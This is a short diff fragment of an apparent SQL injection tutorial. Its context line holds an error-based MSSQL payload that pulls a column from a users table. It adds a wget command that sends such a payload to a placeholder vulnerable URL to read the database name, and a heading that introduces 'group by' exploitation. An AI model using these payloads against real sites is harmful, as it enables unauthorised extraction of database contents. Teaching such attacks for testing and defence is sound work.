@@ -249,6 +249,13 @@ getting all ID's now, the other columns can be extracted, for example, "users"
 
 9999 or 1 in (SELECT TOP 1 CAST ("column name" as varchar) FROM cms..users WHERE id=1); -- -
 
+this information can be retrieved using wget tool, like the following:
+
+wget "vulnerable URL"/products.php?id=1 or 1 IN (SELECT TOP 1 CAST(db_name() as varchar(4096))) --" -q -O -
+
+SQLi exploitation using "group by" statement::
+
+
 
 
 </center>
